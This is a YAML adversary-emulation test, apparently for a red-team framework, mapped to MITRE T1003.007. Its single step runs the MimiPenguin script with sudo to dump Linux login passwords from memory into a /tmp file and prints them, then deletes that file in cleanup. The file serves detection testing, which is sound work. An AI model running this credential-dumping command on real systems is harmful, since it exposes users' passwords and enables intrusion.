api_version: "2.0"
name: Capture Passwords with MimiPenguin
description: "MimiPenguin is a tool inspired by MimiKatz that targets Linux systems affected by CVE-2018-20781 (Ubuntu-based distros and certain versions of GNOME Keyring). \nUpon successful execution on an affected system, MimiPenguin will retrieve passwords from memory and output them to a specified file. \nSee https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20781. \nSee https://www.tecmint.com/mimipenguin-hack-login-passwords-of-linux-users/#:~:text=Mimipenguin%20is%20a%20free%20and,tested%20on%20various%20Linux%20distributions.\n"
args:
    - name: output_file
      type: path
      default: /tmp/T1003.007Test3.txt
    - name: MimiPenguin_Location
      type: path
      default: /tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh
uuid: a27418de-bdce-4ebd-b655-38f04842bf0c
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1003: OS Credential Dumping'
    subtechniques:
        - 'T1003.007: Proc Filesystem'
requirements:
    platforms:
        - os: linux
steps:
    - name: capture-passwords-with-mimipenguin
      inline: |
        sudo {{.Args.MimiPenguin_Location}} > {{.Args.output_file}}
        cat {{.Args.output_file}}
      executor: bash
      cleanup:
        inline: |
            rm -f {{.Args.output_file}} > /dev/null
        executor: bash
